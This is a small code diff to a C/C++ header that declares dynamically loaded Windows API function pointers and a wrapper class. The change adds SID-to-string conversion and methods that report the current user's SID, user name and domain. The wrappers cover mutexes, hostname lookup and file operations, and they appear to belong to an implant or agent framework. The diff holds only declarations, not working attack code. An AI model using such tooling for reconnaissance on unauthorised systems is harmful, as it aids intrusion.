@@ -244,6 +244,7 @@ struct LoadedFunctions
     BOOL (*DeleteFileA)(LPCSTR lpFileName);
     BOOL (*RemoveDirectoryA)(LPCSTR lpPathName);
     BOOL (*HeapValidate)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem);
+    BOOL (*ConvertSidToStringSidA)(PSID Sid, LPSTR *StringSid);
 };
 
 /* Class for WinAPI functions */
@@ -269,8 +270,8 @@ public:
     HANDLE CreateMutexCustom();
     LPVOID GetFQDNComputer();
     HANDLE GetCurrentProcessHandle();
-    void SidToUsernameCustom(IN PSID pSid, OUT LPVOID *ppUserName, OUT LPVOID *ppDomainName);
-    void GetUserNameCustom(OUT LPVOID *ppUserName, OUT LPVOID *ppDomainName);
+    void DescribeSid(IN PSID pSid, OUT CHAR **ppSidString, OUT CHAR **ppUserName, OUT CHAR **ppDomainName);
+    void GetCurrentUserCustom(OUT CHAR** ppSidString, OUT CHAR **ppUserName, OUT CHAR **ppDomainName);
     PCHAR GetCurrentWorkingDirectoryCustom();
     BOOL ChangeCurrentWorkingDirectoryCustom(PCHAR dirPath);
     LPVOID ReadFileCustom(IN PCHAR filePath, OUT PDWORD64 pNumOfBytesRead);
